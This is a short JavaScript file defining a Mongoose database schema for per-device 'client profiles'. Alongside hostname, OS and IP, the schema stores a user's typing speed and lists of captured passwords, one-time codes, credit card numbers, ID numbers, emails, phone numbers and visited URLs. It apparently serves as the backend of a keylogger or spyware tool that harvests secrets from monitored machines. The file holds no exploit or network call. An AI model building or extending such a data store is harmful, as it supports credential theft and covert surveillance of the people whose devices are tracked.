import mongoose from 'mongoose';

const ClientProfileSchema = new mongoose.Schema({
  deviceName: { type: String, required: true }, // e.g., hostname or machine identifier
  display_name: String,      
  registered_on: { type: Date, default: Date.now },
  tags: [String],
  TypingSpeed: Number, //wpm
  offensive_keywords: [String],
  Passwords: [String],
  OTP: [String],
  EmailAddresses: [String],
  PhoneNumbers: [String],
  IDNumbers: [String],
  CreditCardNumbers: [String],
  LocationReferences: [String],
  Names: [String],
  URLs: [String],             
  total_sessions: Number,
  last_seen: Date,
  notes: String,              // Admin notes
  location: String,           // optional 
  system_info: {
    os: String,
    arch: String,
    hostname: String,
    ip: String
  }
});

const ClientProfile = mongoose.model('ClientProfile', ClientProfileSchema);

export default ClientProfile; 